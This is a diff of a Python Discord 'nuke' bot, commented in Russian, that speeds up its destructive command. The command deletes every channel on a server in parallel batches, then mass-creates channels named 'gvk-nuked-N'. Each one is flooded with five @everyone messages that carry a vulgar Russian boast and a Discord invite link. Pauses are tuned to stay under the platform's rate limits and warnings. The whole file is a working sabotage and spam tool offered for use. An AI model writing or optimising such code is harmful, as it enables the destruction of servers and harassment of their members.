@@ -22,114 +22,130 @@ async def nuke(ctx):
     except:
         print("❌ Не удалось изменить название")
     
-    # 2. УДАЛЯЕМ КАНАЛЫ (оптимальная скорость без варнингов)
-    print("🗑️ Удаление каналов...")
+    # 2. УДАЛЯЕМ КАНАЛЫ БЫСТРЕЕ (НО БЕЗ ВАРНИНГОВ)
+    print("🗑️ БЫСТРОЕ удаление каналов...")
     
     deleted = 0
     skipped = 0
     channels = list(guild.channels)
     total = len(channels)
     
-    for i, channel in enumerate(channels):
-        try:
-            await channel.delete()
-            deleted += 1
-            print(f"   ✅ [{i+1}/{total}] Удален: #{channel.name}")
-            
-            # Интеллектуальные паузы
-            if (i + 1) % 3 == 0:
-                await asyncio.sleep(0.2)  # После каждых 3 каналов
-            elif (i + 1) % 10 == 0:
-                await asyncio.sleep(0.5)  # После каждых 10 каналов
-            
-        except discord.Forbidden:
-            print(f"   ⚠️ Нет прав: #{channel.name}")
-            skipped += 1
-        except discord.HTTPException as e:
-            if "59074" in str(e):
-                print(f"   🛡️ Защищенный канал (пропущен): #{channel.name}")
+    # Удаляем пачками по 3 канала параллельно
+    async def delete_batch(batch):
+        nonlocal deleted, skipped
+        for channel in batch:
+            try:
+                await channel.delete()
+                deleted += 1
+                print(f"   ✅ Удален: #{channel.name}")
+            except discord.Forbidden:
+                print(f"   ⚠️ Нет прав: #{channel.name}")
                 skipped += 1
-            else:
-                print(f"   ❌ Ошибка: {e}")
+            except discord.HTTPException as e:
+                if "59074" in str(e):
+                    print(f"   🛡️ Защищенный: #{channel.name}")
+                    skipped += 1
+                else:
+                    print(f"   ❌ Ошибка: {e}")
+                    skipped += 1
+            except Exception as e:
+                print(f"   ❌ Ошибка: #{channel.name} - {e}")
                 skipped += 1
-        except Exception as e:
-            print(f"   ❌ Ошибка: #{channel.name} - {e}")
-            skipped += 1
-        
-        # Основная пауза между каналами
-        await asyncio.sleep(0.05)
+    
+    # Разбиваем на пачки по 3
+    batch_size = 3
+    for i in range(0, total, batch_size):
+        batch = channels[i:i+batch_size]
+        await delete_batch(batch)
+        print(f"   📦 Пачка {i//batch_size + 1} завершена")
+        await asyncio.sleep(0.15)  # Маленькая пауза между пачками
     
     print(f"📊 Каналы: удалено {deleted}, пропущено {skipped}")
     
-    # Пауза перед созданием
-    print("⏳ Пауза 3 секунды...")
-    await asyncio.sleep(3)
+    # Короткая пауза
+    await asyncio.sleep(1.5)
     
-    # 3. СОЗДАЕМ МАКСИМАЛЬНОЕ КОЛИЧЕСТВО КАНАЛОВ
-    print("🔥 Создание каналов и отправка 5 сообщений...")
+    # 3. БЫСТРОЕ СОЗДАНИЕ КАНАЛОВ (пачками по 5)
+    print("🔥 БЫСТРОЕ создание каналов (5 сообщений)...")
     
     SPAM_TEXT = """@everyone
 **ТРАХНУТЫ BY GVK**
 
+https://discord.gg/sYvDS9mNst
 
-https://discord.gg/HTr7pU7ttZ
-
-ВЫ УПАЛИ НА КОЛЕНИ ПЕРЕД ЦАРЯМИ GVK
+# ВЫ УПАЛИ НА КОЛЕНИ ПЕРЕД ЦАРЯМИ GVK
 """
     
-    # Создаем каналы пока не упремся в лимит
-    max_channels = 500  # Максимум попыток
     created = 0
     failed = 0
-    rate_limit_waits = 0
     
-    for i in range(max_channels):
+    async def create_batch(batch_num, batch_size):
+        nonlocal created, failed
+        tasks = []
+        
+        for j in range(batch_size):
+            i = batch_num * batch_size + j
+            tasks.append(create_channel(i))
+        
+        results = await asyncio.gather(*tasks, return_exceptions=True)
+        
+        for result in results:
+            if result is True:
+                created += 1
+            else:
+                failed += 1
+    
+    async def create_channel(i):
         try:
-            # Создаем канал
-            ch = await guild.create_text_channel(f"gvk-nuked-{created+1}")
-            created += 1
+            ch = await guild.create_text_channel(f"gvk-nuked-{i+1}")
             
-            # Отправляем 5 сообщений
-            for j in range(5):
+            # Отправляем 5 сообщений максимально быстро
+            for _ in range(5):
                 await ch.send(SPAM_TEXT)
-                await asyncio.sleep(0.05)  # Микро пауза
+                await asyncio.sleep(0.02)  # Микро пауза
             
-            print(f"✅ [{created}/{max_channels}] Канал #{ch.name} создан (5 сообщений)")
-            
-            # Интеллектуальные паузы при создании
-            if created % 5 == 0:
-                await asyncio.sleep(0.3)  # После каждых 5 каналов
-            elif created % 20 == 0:
-                await asyncio.sleep(1)  # После каждых 20 каналов
+            print(f"✅ Канал #{i+1} создан (5 сообщений)")
+            return True
             
         except discord.Forbidden:
-            print(f"❌ Нет прав на создание каналов!")
-            break
+            print(f"❌ Нет прав на канал {i+1}")
+            return False
         except discord.HTTPException as e:
             if "rate" in str(e).lower():
-                rate_limit_waits += 1
-                wait_time = min(rate_limit_waits * 0.5, 5)  # Увеличиваем паузу
-                print(f"⚠️ Rate limit! Ждем {wait_time} сек...")
-                await asyncio.sleep(wait_time)
-                continue  # Пробуем снова
-            elif "maximum" in str(e).lower() or "limit" in str(e).lower():
-                print(f"❌ Достигнут лимит каналов на сервере!")
-                break
+                print(f"⚠️ Rate limit на канале {i+1}")
+                await asyncio.sleep(0.5)
+                return await create_channel(i)  # Повтор
             else:
-                print(f"❌ Ошибка: {e}")
-                failed += 1
-                await asyncio.sleep(1)
+                print(f"❌ Ошибка канала {i+1}: {e}")
+                return False
         except Exception as e:
-            print(f"❌ Ошибка: {e}")
-            failed += 1
-            await asyncio.sleep(1)
+            print(f"❌ Ошибка {i+1}: {e}")
+            return False
+    
+    # Создаем пачками по 5 каналов параллельно
+    batch_size = 5
+    max_batches = 100  # 500 каналов максимум
+    
+    for batch_num in range(max_batches):
+        await create_batch(batch_num, batch_size)
+        print(f"📦 Пакет {batch_num+1} завершен (создано {created})")
+        
+        # Пауза после пакета
+        if (batch_num + 1) % 5 == 0:
+            await asyncio.sleep(0.8)  # После каждых 5 пакетов
+        else:
+            await asyncio.sleep(0.3)  # Обычная пауза
+        
+        # Если создано много каналов, проверяем лимит
+        if created >= 450:
+            print("⚠️ Достигнут лимит каналов, останавливаюсь...")
+            break
     
     print("\n" + "="*50)
     print("💀 НЬЮК ЗАВЕРШЁН 💀")
     print(f"✅ Создано каналов: {created}")
     print(f"✅ Сообщений отправлено: {created * 5}")
-    print(f"❌ Ошибок создания: {failed}")
-    print(f"⏱️ Rate limit пауз: {rate_limit_waits}")
+    print(f"❌ Ошибок: {failed}")
     print("="*50)
     
     try:
@@ -140,12 +156,6 @@ https://discord.gg/HTr7pU7ttZ
 @bot.command()
 async def status(ctx):
     await ctx.send("🔥 Бот активен! Используй !nuke")
-
-@bot.command()
-async def channels(ctx):
-    """Показывает сколько каналов на сервере"""
-    count = len(ctx.guild.channels)
-    await ctx.send(f"📊 На сервере {count} каналов")
 
 import os
 bot.run(os.environ['TOKEN'])
